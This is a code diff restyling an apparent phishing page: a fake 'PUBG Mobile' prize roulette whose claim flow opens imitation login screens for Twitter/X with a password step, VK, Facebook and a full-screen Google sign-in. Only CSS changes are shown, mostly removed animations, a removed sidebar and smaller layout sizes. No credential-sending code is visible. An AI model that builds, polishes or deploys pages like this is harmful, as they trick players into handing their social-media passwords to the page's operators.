@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Официальная рулетка</title>
+    <title>PUBG Mobile - Рулетка</title>
     <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700&display=swap" rel="stylesheet">
     <style>
         * {
@@ -23,8 +23,6 @@
             overflow-x: hidden;
             font-family: Arial, sans-serif;
             position: relative;
-            width: 100%;
-            max-width: 100vw;
         }
         
         /* Фон на весь сайт */
@@ -55,111 +53,10 @@
             z-index: -1;
         }
         
-        /* Боковое меню */
-        .sidebar {
-            position: fixed;
-            left: 0;
-            top: 0;
-            width: 250px;
-            height: 100%;
-            background: rgba(20, 35, 60, 0.95);
-            backdrop-filter: blur(10px);
-            border-right: 2px solid #2a3b5a;
-            z-index: 1000;
-            transform: translateX(-100%);
-            transition: transform 0.3s ease;
-            padding: 20px;
-            display: flex;
-            flex-direction: column;
-            box-shadow: 5px 0 15px rgba(0, 0, 0, 0.3);
-        }
-        
-        .sidebar.active {
-            transform: translateX(0);
-        }
-        
-        .menu-toggle {
-            position: fixed;
-            left: 20px;
-            top: 20px;
-            background: rgba(24, 119, 242, 0.8);
-            color: white;
-            border: none;
-            width: 50px;
-            height: 50px;
-            border-radius: 50%;
-            font-size: 20px;
-            cursor: pointer;
-            z-index: 999;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            transition: all 0.3s;
-            box-shadow: 0 4px 10px rgba(24, 119, 242, 0.3);
-        }
-        
-        .menu-toggle:hover {
-            background: rgba(24, 119, 242, 1);
-            transform: scale(1.1);
-        }
-        
-        .sidebar-header {
-            text-align: center;
-            padding-bottom: 20px;
-            margin-bottom: 20px;
-            border-bottom: 1px solid #2a3b5a;
-        }
-        
-        .sidebar-header h3 {
-            color: #8da1b5;
-            font-family: 'Orbitron', sans-serif;
-            font-size: 18px;
-        }
-        
-        .menu-item {
-            padding: 15px;
-            margin: 10px 0;
-            background: rgba(42, 59, 90, 0.3);
-            border-radius: 10px;
-            border: 1px solid #2a3b5a;
-            cursor: pointer;
-            transition: all 0.3s;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            color: #8da1b5;
-            font-size: 14px;
-            font-weight: 500;
-        }
-        
-        .menu-item:hover {
-            background: rgba(24, 119, 242, 0.2);
-            border-color: #1877F2;
-            transform: translateX(5px);
-            color: white;
-        }
-        
-        .menu-item i {
-            font-size: 18px;
-            width: 25px;
-        }
-        
-        .menu-item.support {
-            background: linear-gradient(135deg, #7B68EE, #4B0082);
-            border-color: #7B68EE;
-            color: white;
-            margin-top: auto;
-        }
-        
-        .menu-item.support:hover {
-            background: linear-gradient(135deg, #8A2BE2, #5D00BA);
-            transform: translateX(5px);
-        }
-        
-        /* Верхнее меню - ИСПРАВЛЕННОЕ */
+        /* Верхнее меню */
         .top-menu {
             width: 100%;
-            max-width: 1400px;
+            max-width: 800px;
             display: flex;
             justify-content: space-between;
             align-items: center;
@@ -170,13 +67,10 @@
             border: 1px solid #2a3b5a;
             backdrop-filter: blur(10px);
             z-index: 100;
-            position: relative;
         }
         
         .language-menu {
             position: relative;
-            flex: 1;
-            min-width: 120px;
         }
         
         .language-btn {
@@ -191,8 +85,6 @@
             display: flex;
             align-items: center;
             gap: 8px;
-            width: 100%;
-            justify-content: space-between;
         }
         
         .language-dropdown {
@@ -211,25 +103,13 @@
         
         .language-dropdown.show {
             display: block;
-            animation: fadeInDropdown 0.3s ease;
-        }
-        
-        @keyframes fadeInDropdown {
-            from {
-                opacity: 0;
-                transform: translateY(-10px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
         }
         
         .language-option {
             padding: 10px 15px;
             cursor: pointer;
             border-bottom: 1px solid #2a3b5a;
-            transition: all 0.3s;
+            transition: background 0.3s;
             color: #8da1b5;
             font-weight: 400;
             font-family: Arial, sans-serif;
@@ -237,7 +117,6 @@
         
         .language-option:hover {
             background: #2a3b5a;
-            transform: translateX(5px);
         }
         
         .logo {
@@ -249,15 +128,12 @@
             position: absolute;
             left: 50%;
             transform: translateX(-50%);
-            white-space: nowrap;
         }
         
         /* Иконка почты для приза с анимацией */
         .prize-mail-icon {
-            flex: 1;
-            display: flex;
-            justify-content: flex-end;
-            min-width: 120px;
+            position: relative;
+            margin-left: auto;
         }
         
         .prize-mail-btn {
@@ -276,13 +152,11 @@
             transition: all 0.3s;
             font-family: 'Orbitron', sans-serif;
             font-size: 12px;
-            margin-left: auto;
         }
         
         .prize-mail-btn:hover:not(:disabled) {
             background: linear-gradient(to right, #3a4b6a, #2a3c52);
             transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
         }
         
         .prize-badge {
@@ -344,18 +218,6 @@
             text-align: center;
             position: relative;
             box-shadow: 0 0 60px rgba(24, 119, 242, 0.15);
-            animation: popIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-        }
-
-        @keyframes popIn {
-            from {
-                opacity: 0;
-                transform: scale(0.8) translateY(20px);
-            }
-            to {
-                opacity: 1;
-                transform: scale(1) translateY(0);
-            }
         }
 
         .prize-banner {
@@ -371,16 +233,6 @@
             font-size: 20px;
             clip-path: polygon(5% 0%, 95% 0%, 100% 50%, 95% 100%, 5% 100%, 0% 50%);
             box-shadow: 0 4px 15px rgba(24, 119, 242, 0.4);
-            animation: bannerFloat 3s ease-in-out infinite;
-        }
-
-        @keyframes bannerFloat {
-            0%, 100% {
-                transform: translateX(-50%) translateY(0);
-            }
-            50% {
-                transform: translateX(-50%) translateY(-5px);
-            }
         }
 
         .prize-glow-container {
@@ -413,16 +265,6 @@
             object-fit: contain;
             z-index: 2;
             filter: drop-shadow(0 0 20px rgba(255,255,255,0.2));
-            animation: floatPrize 4s ease-in-out infinite;
-        }
-
-        @keyframes floatPrize {
-            0%, 100% {
-                transform: translateY(0) rotate(0deg);
-            }
-            50% {
-                transform: translateY(-10px) rotate(5deg);
-            }
         }
 
         .prize-name {
@@ -431,16 +273,6 @@
             font-size: 24px;
             margin-bottom: 10px;
             text-transform: uppercase;
-            animation: textGlow 2s ease-in-out infinite alternate;
-        }
-
-        @keyframes textGlow {
-            from {
-                text-shadow: 0 0 5px rgba(255,255,255,0.3);
-            }
-            to {
-                text-shadow: 0 0 15px rgba(24, 119, 242, 0.7);
-            }
         }
 
         .prize-desc {
@@ -463,16 +295,6 @@
             cursor: pointer;
             transition: 0.2s;
             box-shadow: 0 5px 0 #0d47a1;
-            animation: buttonPulse 2s infinite;
-        }
-
-        @keyframes buttonPulse {
-            0%, 100% {
-                box-shadow: 0 5px 0 #0d47a1;
-            }
-            50% {
-                box-shadow: 0 5px 0 #0d47a1, 0 0 20px rgba(24, 119, 242, 0.5);
-            }
         }
 
         .collect-btn:active {
@@ -487,7 +309,7 @@
         
         .container {
             width: 100%;
-            max-width: 1400px;
+            max-width: 800px;
             display: flex;
             flex-direction: column;
             align-items: center;
@@ -508,16 +330,6 @@
             font-weight: 500;
             letter-spacing: 1px;
             text-shadow: 0 2px 4px rgba(0, 0, 0, 0.5);
-            animation: titleGlow 3s ease-in-out infinite alternate;
-        }
-
-        @keyframes titleGlow {
-            from {
-                text-shadow: 0 0 10px rgba(141, 161, 181, 0.3);
-            }
-            to {
-                text-shadow: 0 0 20px rgba(141, 161, 181, 0.6);
-            }
         }
         
         .header p {
@@ -528,11 +340,11 @@
             text-shadow: 0 1px 2px rgba(0, 0, 0, 0.5);
         }
         
-        /* ОБНОВЛЕННЫЙ КОНТЕЙНЕР РУЛЕТКИ */
+        /* ОБНОВЛЕННЫЙ КОНТЕЙНЕР РУЛЕТКИ - УМЕНЬШЕННЫЙ */
         .roulette-container {
             position: relative;
             width: 100%;
-            height: 450px;
+            height: 380px;
             background: rgba(20, 35, 60, 0.3);
             border-radius: 20px;
             overflow: hidden;
@@ -545,21 +357,9 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            animation: rouletteFloat 6s ease-in-out infinite;
-        }
-
-        @keyframes rouletteFloat {
-            0%, 100% {
-                transform: translateY(0);
-                box-shadow: 0 15px 30px rgba(0, 0, 0, 0.6);
-            }
-            50% {
-                transform: translateY(-10px);
-                box-shadow: 0 25px 40px rgba(0, 0, 0, 0.7);
-            }
         }
         
-        /* СЕТКА ПРИЗОВ */
+        /* УМЕНЬШЕННАЯ СЕТКА ПРИЗОВ */
         .prizes-grid {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
@@ -601,7 +401,7 @@
         }
         
         .prize-item:hover {
-            transform: translateY(-3px) scale(1.05);
+            transform: translateY(-3px);
             border-color: rgba(24, 119, 242, 0.3);
             box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
         }
@@ -611,8 +411,8 @@
         }
         
         .prize-item img {
-            width: 110px;
-            height: 110px;
+            width: 85px;
+            height: 85px;
             object-fit: contain;
             transition: all 0.4s;
             filter: drop-shadow(0 5px 10px rgba(0, 0, 0, 0.3));
@@ -631,22 +431,22 @@
         }
         
         .center-item img {
-            width: 90px;
-            height: 90px;
+            width: 70px;
+            height: 70px;
             filter: drop-shadow(0 0 10px rgba(24, 119, 242, 0.5));
             opacity: 0.8;
         }
         
-        /* ОБНОВЛЕННАЯ РАМКА ВЫБОРА - РАВНОМЕРНАЯ */
+        /* УМЕНЬШЕННАЯ РАМКА ВЫБОРА */
         .selection-frame {
             position: absolute;
             border: 2px solid #1877F2;
-            border-radius: 12px;
+            border-radius: 15px;
             box-shadow: 
                 0 0 20px rgba(24, 119, 242, 0.8),
                 0 0 40px rgba(24, 119, 242, 0.4),
                 inset 0 0 20px rgba(24, 119, 242, 0.2);
-            transition: all 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
             z-index: 100;
             pointer-events: none;
             opacity: 0;
@@ -660,12 +460,12 @@
         .selection-frame::before {
             content: '';
             position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
+            top: -6px;
+            left: -6px;
+            right: -6px;
+            bottom: -6px;
             border: 1px solid rgba(255, 255, 255, 0.3);
-            border-radius: 12px;
+            border-radius: 18px;
             animation: borderRotate 4s linear infinite;
             pointer-events: none;
         }
@@ -673,26 +473,16 @@
         .selection-frame::after {
             content: '';
             position: absolute;
-            top: 4px;
-            left: 4px;
-            right: 4px;
-            bottom: 4px;
+            top: 6px;
+            left: 6px;
+            right: 6px;
+            bottom: 6px;
             border: 1px solid rgba(255, 255, 255, 0.2);
-            border-radius: 8px;
+            border-radius: 12px;
             pointer-events: none;
-            animation: innerGlow 3s ease-in-out infinite alternate;
-        }
-
-        @keyframes innerGlow {
-            from {
-                border-color: rgba(255, 255, 255, 0.2);
-            }
-            to {
-                border-color: rgba(24, 119, 242, 0.4);
-            }
         }
         
-        /* Уголки рамки */
+        /* Уголки рамки - УМЕНЬШЕННЫЕ */
         .corner {
             position: absolute;
             width: 12px;
@@ -707,7 +497,6 @@
             border-right: none;
             border-bottom: none;
             border-top-left-radius: 6px;
-            animation: cornerPulse 2s infinite;
         }
         
         .corner-tr {
@@ -716,7 +505,6 @@
             border-left: none;
             border-bottom: none;
             border-top-right-radius: 6px;
-            animation: cornerPulse 2s infinite 0.5s;
         }
         
         .corner-bl {
@@ -725,7 +513,6 @@
             border-right: none;
             border-top: none;
             border-bottom-left-radius: 6px;
-            animation: cornerPulse 2s infinite 1s;
         }
         
         .corner-br {
@@ -734,35 +521,13 @@
             border-left: none;
             border-top: none;
             border-bottom-right-radius: 6px;
-            animation: cornerPulse 2s infinite 1.5s;
-        }
-
-        @keyframes cornerPulse {
-            0%, 100% {
-                opacity: 0.8;
-                transform: scale(1);
-            }
-            50% {
-                opacity: 1;
-                transform: scale(1.3);
-            }
         }
         
         .selection-frame.active {
             opacity: 1;
             animation: 
                 pulse 1.2s infinite alternate,
-                glow 2s infinite alternate,
-                frameFloat 3s ease-in-out infinite;
-        }
-
-        @keyframes frameFloat {
-            0%, 100% {
-                transform: translateY(0);
-            }
-            50% {
-                transform: translateY(-3px);
-            }
+                glow 2s infinite alternate;
         }
         
         @keyframes borderRotate {
@@ -799,7 +564,7 @@
             }
         }
         
-        /* ИНДИКАТОР ВЫБОРА */
+        /* ИНДИКАТОР ВЫБОРА - УМЕНЬШЕННЫЙ */
         .selection-indicator {
             position: absolute;
             top: -30px;
@@ -816,16 +581,6 @@
             z-index: 101;
             opacity: 0;
             transition: opacity 0.3s;
-            animation: indicatorFloat 2s ease-in-out infinite;
-        }
-
-        @keyframes indicatorFloat {
-            0%, 100% {
-                transform: translateX(-50%) translateY(0);
-            }
-            50% {
-                transform: translateX(-50%) translateY(-3px);
-            }
         }
         
         .selection-indicator::after {
@@ -843,10 +598,10 @@
             opacity: 1;
         }
         
-        /* КНОПКА ИГРАТЬ - ИЗМЕНЕН ЦВЕТ НА СИНИЙ */
+        /* КНОПКА ИГРАТЬ */
         .play-btn {
-            background: linear-gradient(180deg, #7B68EE 0%, #4B0082 100%);
-            color: white;
+            background: linear-gradient(180deg, #ffb000 0%, #ff8000 100%);
+            color: #000;
             border: none;
             border-radius: 60px;
             padding: 20px 45px;
@@ -854,7 +609,7 @@
             font-weight: 700;
             cursor: pointer;
             box-shadow: 
-                0 8px 25px rgba(123, 104, 238, 0.4),
+                0 8px 25px rgba(255, 128, 0, 0.4),
                 inset 0 1px 0 rgba(255, 255, 255, 0.3);
             transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
             margin-bottom: 30px;
@@ -886,10 +641,9 @@
         .play-btn:hover:not(:disabled) {
             transform: translateY(-8px) scale(1.05);
             box-shadow: 
-                0 15px 35px rgba(123, 104, 238, 0.6),
+                0 15px 35px rgba(255, 128, 0, 0.6),
                 inset 0 1px 0 rgba(255, 255, 255, 0.3);
             letter-spacing: 3px;
-            background: linear-gradient(180deg, #8A2BE2 0%, #5D00BA 100%);
         }
         
         .play-btn:hover::before {
@@ -919,7 +673,7 @@
             border-radius: 20px;
             padding: 25px;
             width: 100%;
-            max-width: 800px;
+            max-width: 600px;
             display: none;
             margin-top: 20px;
             border: 2px solid rgba(24, 119, 242, 0.3);
@@ -967,7 +721,7 @@
         
         .social-grid {
             display: grid;
-            grid-template-columns: repeat(4, 1fr);
+            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
             gap: 15px;
             margin-bottom: 25px;
         }
@@ -1003,16 +757,6 @@
             transform: translateY(-5px) scale(1.05);
             border-color: rgba(24, 119, 242, 0.5);
             box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3);
-            animation: socialOptionHover 0.3s ease-out;
-        }
-
-        @keyframes socialOptionHover {
-            from {
-                transform: translateY(0) scale(1);
-            }
-            to {
-                transform: translateY(-5px) scale(1.05);
-            }
         }
         
         .social-option:hover::before {
@@ -1026,16 +770,6 @@
                 0 0 20px rgba(24, 119, 242, 0.4),
                 inset 0 0 10px rgba(24, 119, 242, 0.1);
             transform: scale(1.05);
-            animation: selectedSocial 0.5s ease-out infinite alternate;
-        }
-
-        @keyframes selectedSocial {
-            from {
-                box-shadow: 0 0 20px rgba(24, 119, 242, 0.4);
-            }
-            to {
-                box-shadow: 0 0 30px rgba(24, 119, 242, 0.7);
-            }
         }
         
         .social-icon {
@@ -1050,16 +784,6 @@
             background: rgba(255, 255, 255, 0.1);
             padding: 10px;
             transition: all 0.3s;
-            animation: iconFloat 3s ease-in-out infinite;
-        }
-
-        @keyframes iconFloat {
-            0%, 100% {
-                transform: translateY(0);
-            }
-            50% {
-                transform: translateY(-5px);
-            }
         }
         
         .social-icon img, .social-icon svg {
@@ -1072,16 +796,6 @@
         .social-option.selected .social-icon {
             background: rgba(24, 119, 242, 0.2);
             transform: scale(1.1);
-            animation: selectedIcon 1s ease-in-out infinite alternate;
-        }
-
-        @keyframes selectedIcon {
-            from {
-                transform: scale(1.1);
-            }
-            to {
-                transform: scale(1.15);
-            }
         }
         
         .social-option span {
@@ -1099,7 +813,7 @@
         
         /* КНОПКА ПОЛУЧИТЬ ПРИЗ */
         .get-prize-btn {
-            background: linear-gradient(180deg, #7B68EE 0%, #4B0082 100%);
+            background: linear-gradient(180deg, #1877F2 0%, #1153b3 100%);
             color: white;
             border: none;
             border-radius: 60px;
@@ -1108,7 +822,7 @@
             font-weight: 700;
             cursor: pointer;
             box-shadow: 
-                0 10px 30px rgba(123, 104, 238, 0.4),
+                0 10px 30px rgba(24, 119, 242, 0.4),
                 inset 0 1px 0 rgba(255, 255, 255, 0.3);
             transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
             width: 100%;
@@ -1143,10 +857,9 @@
         .get-prize-btn:hover:not(:disabled) {
             transform: translateY(-5px);
             box-shadow: 
-                0 15px 35px rgba(123, 104, 238, 0.6),
+                0 15px 35px rgba(24, 119, 242, 0.6),
                 inset 0 1px 0 rgba(255, 255, 255, 0.3);
             letter-spacing: 2px;
-            background: linear-gradient(180deg, #8A2BE2 0%, #5D00BA 100%);
         }
         
         .get-prize-btn:hover::before {
@@ -1171,7 +884,7 @@
             border-radius: 20px;
             padding: 40px 30px;
             width: 100%;
-            max-width: 800px;
+            max-width: 600px;
             display: none;
             margin-top: 20px;
             border: 2px solid rgba(76, 175, 80, 0.3);
@@ -1191,16 +904,7 @@
             font-size: 80px;
             color: #4CAF50;
             margin-bottom: 20px;
-            animation: bounce 1s infinite alternate, rotateConfirmation 5s linear infinite;
-        }
-
-        @keyframes rotateConfirmation {
-            from {
-                transform: rotate(0deg);
-            }
-            to {
-                transform: rotate(360deg);
-            }
+            animation: bounce 1s infinite alternate;
         }
         
         @keyframes bounce {
@@ -1228,94 +932,54 @@
             background: rgba(76, 175, 80, 0.1);
             border-radius: 15px;
             border: 1px solid rgba(76, 175, 80, 0.3);
-            animation: messagePulse 3s infinite alternate;
-        }
-
-        @keyframes messagePulse {
-            from {
-                box-shadow: inset 0 0 10px rgba(76, 175, 80, 0.1);
-            }
-            to {
-                box-shadow: inset 0 0 20px rgba(76, 175, 80, 0.3);
-            }
         }
         
-        /* ОБНОВЛЕННЫЕ УВЕДОМЛЕНИЯ */
+        /* УВЕДОМЛЕНИЯ */
         .notification {
             position: fixed;
             top: 20px;
             right: 20px;
-            background: linear-gradient(135deg, #1a2c42, #0a1520);
-            color: #8da1b5;
-            padding: 15px 25px;
-            border-radius: 12px;
-            border: 1px solid #2a3b5a;
+            background: linear-gradient(135deg, #2a3b5a, #1a2c42);
+            color: #1877F2;
+            padding: 20px 30px;
+            border-radius: 15px;
+            border-left: 5px solid #1877F2;
             box-shadow: 
-                0 10px 30px rgba(0, 0, 0, 0.5),
+                0 10px 25px rgba(0, 0, 0, 0.4),
                 inset 0 1px 0 rgba(255, 255, 255, 0.1);
             display: none;
             z-index: 1001;
-            max-width: 400px;
+            max-width: 350px;
             animation: slideInRight 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            font-family: 'Orbitron', sans-serif;
-            font-size: 14px;
-            letter-spacing: 1px;
+            font-family: Arial, sans-serif;
             backdrop-filter: blur(10px);
-            border-left: 4px solid #7B68EE;
-        }
-
-        @keyframes slideInRight {
-            from { 
-                transform: translateX(100%);
-                opacity: 0; 
-            }
-            to { 
-                transform: translateX(0);
-                opacity: 1; 
-            }
+            font-weight: 500;
         }
         
         .notification.error {
-            color: #ff6b6b;
-            border-left-color: #ff6b6b;
-            background: linear-gradient(135deg, rgba(255, 107, 107, 0.1), #0a1520);
+            color: #ff4444;
+            border-left-color: #ff4444;
+            background: linear-gradient(135deg, #5a1a1a, #3a0a0a);
         }
         
         .notification.success {
             color: #4CAF50;
             border-left-color: #4CAF50;
-            background: linear-gradient(135deg, rgba(76, 175, 80, 0.1), #0a1520);
+            background: linear-gradient(135deg, #1a5a1a, #0a3a0a);
         }
         
-        .notification.warning {
-            color: #ffa726;
-            border-left-color: #ffa726;
-            background: linear-gradient(135deg, rgba(255, 167, 38, 0.1), #0a1520);
+        @keyframes slideInRight {
+            from { 
+                transform: translateX(100%) scale(0.8); 
+                opacity: 0; 
+            }
+            to { 
+                transform: translateX(0) scale(1); 
+                opacity: 1; 
+            }
         }
         
-        .notification-info {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            margin-top: 15px;
-            padding: 10px;
-            background: rgba(24, 119, 242, 0.1);
-            border-radius: 8px;
-            border: 1px solid rgba(24, 119, 242, 0.3);
-        }
-        
-        .notification-info i {
-            color: #1877F2;
-            font-size: 16px;
-        }
-        
-        .notification-info span {
-            font-size: 12px;
-            line-height: 1.4;
-            color: #8da1b5;
-        }
-        
-        /* ОСТАЛЬНЫЕ СТИЛИ */
+        /* ОСТАЛЬНЫЕ СТИЛИ (остаются без изменений) */
         .modal-overlay {
             position: fixed;
             top: 0;
@@ -1348,18 +1012,6 @@
             max-width: 380px;
             box-shadow: 0 20px 50px rgba(0, 0, 0, 0.7);
             position: relative;
-            animation: modalAppear 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-        }
-
-        @keyframes modalAppear {
-            from {
-                opacity: 0;
-                transform: scale(0.8) translateY(20px);
-            }
-            to {
-                opacity: 1;
-                transform: scale(1) translateY(0);
-            }
         }
         
         .modal-dark {
@@ -1388,10 +1040,9 @@
             color: #333;
         }
         
-        /* Twitter/X стиль */
+        /* Twitter/X стиль - ДВУХЭТАПНЫЙ ВХОД */
         .x-modal-step1 {
             padding: 30px;
-            animation: modalAppear 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
         }
         
         .x-logo {
@@ -1399,16 +1050,6 @@
             height: 40px;
             margin: 0 auto 30px;
             display: block;
-            animation: logoFloat 3s ease-in-out infinite;
-        }
-
-        @keyframes logoFloat {
-            0%, 100% {
-                transform: translateY(0);
-            }
-            50% {
-                transform: translateY(-5px);
-            }
         }
         
         .x-title {
@@ -1438,7 +1079,7 @@
             align-items: center;
             justify-content: center;
             gap: 10px;
-            transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            transition: background 0.2s;
             font-family: Arial, sans-serif;
         }
         
@@ -1450,8 +1091,6 @@
         
         .social-login-btn:hover {
             background: #F7F9F9;
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
         }
         
         .modal-dark .social-login-btn:hover {
@@ -1501,7 +1140,6 @@
             background: white;
             color: #0F1419;
             font-family: Arial, sans-serif;
-            transition: all 0.3s;
         }
         
         .modal-dark .x-input {
@@ -1513,8 +1151,6 @@
         .x-input:focus {
             outline: none;
             border-color: #1D9BF0;
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(29, 155, 240, 0.2);
         }
         
         .x-next-btn {
@@ -1529,7 +1165,6 @@
             cursor: pointer;
             margin-bottom: 20px;
             font-family: Arial, sans-serif;
-            transition: all 0.3s;
         }
         
         .modal-dark .x-next-btn {
@@ -1538,8 +1173,6 @@
         
         .x-next-btn:hover {
             background: #272C30;
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
         }
         
         .modal-dark .x-next-btn:hover {
@@ -1581,23 +1214,11 @@
             text-decoration: underline;
         }
         
-        /* Twitter/X модальное окно для пароля */
+        /* Twitter/X модальное окно для пароля (этап 2) - ЧЕРНЫЙ ФОН */
         .x-modal-step2 {
             background: #000000;
             color: white;
             padding: 30px;
-            animation: slideInRight 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-        }
-
-        @keyframes slideInRight {
-            from {
-                opacity: 0;
-                transform: translateX(20px);
-            }
-            to {
-                opacity: 1;
-                transform: translateX(0);
-            }
         }
         
         .x-step2-title {
@@ -1627,14 +1248,11 @@
             background: #000;
             color: white;
             font-family: Arial, sans-serif;
-            transition: all 0.3s;
         }
         
         .x-password-input:focus {
             outline: none;
             border-color: #1D9BF0;
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(29, 155, 240, 0.2);
         }
         
         .x-login-btn {
@@ -1649,13 +1267,10 @@
             cursor: pointer;
             margin-bottom: 20px;
             font-family: Arial, sans-serif;
-            transition: all 0.3s;
         }
         
         .x-login-btn:hover {
             background: #1A8CD8;
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(29, 155, 240, 0.3);
         }
         
         .x-forgot-password {
@@ -1698,7 +1313,6 @@
             height: 48px;
             margin: 0 auto 30px;
             display: block;
-            animation: logoFloat 3s ease-in-out infinite;
         }
         
         .vk-title {
@@ -1728,15 +1342,12 @@
             background: #F2F3F5;
             color: #000;
             font-family: Arial, sans-serif;
-            transition: all 0.3s;
         }
         
         .vk-input:focus {
             outline: none;
             border-color: #4A76A8;
             background: white;
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(74, 118, 168, 0.2);
         }
         
         .vk-checkbox {
@@ -1769,13 +1380,10 @@
             cursor: pointer;
             margin-bottom: 20px;
             font-family: Arial, sans-serif;
-            transition: all 0.3s;
         }
         
         .vk-submit-btn:hover {
             background: #3C658F;
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(74, 118, 168, 0.3);
         }
         
         .vk-links {
@@ -1801,7 +1409,6 @@
             max-width: 400px;
             overflow: hidden;
             border-radius: 8px;
-            animation: modalAppear 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
         }
         
         .fb-header {
@@ -1818,7 +1425,6 @@
             display: block;
             margin-left: auto;
             margin-right: auto;
-            animation: logoFloat 3s ease-in-out infinite;
         }
         
         .fb-content {
@@ -1836,14 +1442,12 @@
             background: white;
             color: #1C1E21;
             font-family: Arial, sans-serif;
-            transition: all 0.3s;
         }
         
         .fb-input:focus {
             outline: none;
             border-color: #1877F2;
             box-shadow: 0 0 0 2px #E7F3FF;
-            transform: translateY(-2px);
         }
         
         .fb-submit-btn {
@@ -1858,13 +1462,10 @@
             cursor: pointer;
             margin: 10px 0 20px;
             font-family: Arial, sans-serif;
-            transition: all 0.3s;
         }
         
         .fb-submit-btn:hover {
             background: #166FE5;
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(24, 119, 242, 0.3);
         }
         
         .fb-link {
@@ -1900,13 +1501,10 @@
             cursor: pointer;
             display: block;
             font-family: Arial, sans-serif;
-            transition: all 0.3s;
         }
         
         .fb-create-btn:hover {
             background: #36A420;
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(66, 183, 42, 0.3);
         }
         
         /* СТИЛИ ДЛЯ ПОЛНОЭКРАННОЙ СТРАНИЦЫ GOOGLE */
@@ -1920,16 +1518,6 @@
             z-index: 3000;
             display: none;
             overflow-y: auto;
-            animation: googleFadeIn 0.4s ease;
-        }
-
-        @keyframes googleFadeIn {
-            from {
-                opacity: 0;
-            }
-            to {
-                opacity: 1;
-            }
         }
         
         .google-fullscreen.active {
@@ -1943,37 +1531,12 @@
             position: relative;
             top: 50%;
             transform: translateY(-50%);
-            animation: googleSlideUp 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-        }
-
-        @keyframes googleSlideUp {
-            from {
-                opacity: 0;
-                transform: translateY(-50%) scale(0.9);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(-50%) scale(1);
-            }
         }
 
         .google-logo {
             width: 75px;
             display: block;
             margin-bottom: 25px;
-            animation: googleLogoFloat 4s ease-in-out infinite;
-        }
-
-        @keyframes googleLogoFloat {
-            0%, 100% {
-                transform: translateY(0) rotate(0deg);
-            }
-            25% {
-                transform: translateY(-5px) rotate(5deg);
-            }
-            75% {
-                transform: translateY(5px) rotate(-5deg);
-            }
         }
 
         .google-title {
@@ -2006,16 +1569,6 @@
             font-size: 12px;
             color: #1a73e8;
             z-index: 1;
-            animation: labelPulse 2s infinite alternate;
-        }
-
-        @keyframes labelPulse {
-            from {
-                color: #1a73e8;
-            }
-            to {
-                color: #0d47a1;
-            }
         }
 
         .google-input {
@@ -2026,13 +1579,6 @@
             font-size: 16px;
             box-sizing: border-box;
             outline: none;
-            transition: all 0.3s;
-        }
-
-        .google-input:focus {
-            border-color: #0d47a1;
-            box-shadow: 0 0 10px rgba(26, 115, 232, 0.3);
-            transform: translateY(-2px);
         }
 
         .google-guest-mode {
@@ -2063,12 +1609,6 @@
             border: none;
             font-size: 14px;
             padding: 8px;
-            transition: all 0.3s;
-        }
-
-        .google-btn-text:hover {
-            color: #0d47a1;
-            transform: translateY(-2px);
         }
 
         .google-btn-blue {
@@ -2080,13 +1620,6 @@
             font-weight: 500;
             cursor: pointer;
             font-size: 14px;
-            transition: all 0.3s;
-        }
-
-        .google-btn-blue:hover {
-            background-color: #0d47a1;
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(26, 115, 232, 0.4);
         }
 
         .google-lang-footer {
@@ -2137,226 +1670,10 @@
             margin-bottom: 40px;
         }
 
-        /* Новый информационный блок */
-        .info-section {
-            background: rgba(20, 35, 60, 0.9);
-            border-radius: 20px;
-            padding: 30px;
-            width: 100%;
-            max-width: 800px;
-            margin: 30px 0;
-            border: 2px solid rgba(123, 104, 238, 0.3);
-            box-shadow: 
-                0 15px 30px rgba(0, 0, 0, 0.5),
-                inset 0 0 20px rgba(42, 59, 90, 0.2);
-            backdrop-filter: blur(10px);
-        }
-        
-        .info-section h2 {
-            color: #7B68EE;
-            text-align: center;
-            margin-bottom: 20px;
-            font-size: 24px;
-            font-family: 'Orbitron', sans-serif;
-            font-weight: 500;
-            letter-spacing: 1px;
-            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
-        }
-        
-        .info-block {
-            background: rgba(12, 26, 45, 0.7);
-            border-radius: 15px;
-            padding: 20px;
-            margin-bottom: 15px;
-            border: 1px solid #2a3b5a;
-            transition: all 0.3s;
-        }
-        
-        .info-block:hover {
-            border-color: #7B68EE;
-            transform: translateY(-2px);
